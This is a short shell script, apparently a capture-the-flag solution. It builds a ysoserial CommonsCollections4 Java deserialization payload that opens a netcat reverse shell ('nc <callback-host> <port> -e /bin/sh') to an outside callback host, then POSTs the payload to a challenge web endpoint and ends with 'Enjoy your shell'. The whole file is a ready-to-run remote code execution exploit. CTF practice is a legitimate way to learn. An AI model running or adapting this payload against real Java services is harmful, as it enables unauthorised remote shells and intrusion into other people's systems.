#!/bin/sh

# Fetch ysoserial from https://github.com/frohoff/ysoserial

# Expects <callback-host> listening on <port>

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 "nc <callback-host> <port> -e /bin/sh" | base64 |  curl --request POST -v --data-binary "@-" http://p100-ctf-d10e7f04b564847c.pixels.camp/text

# Enjoy your shell
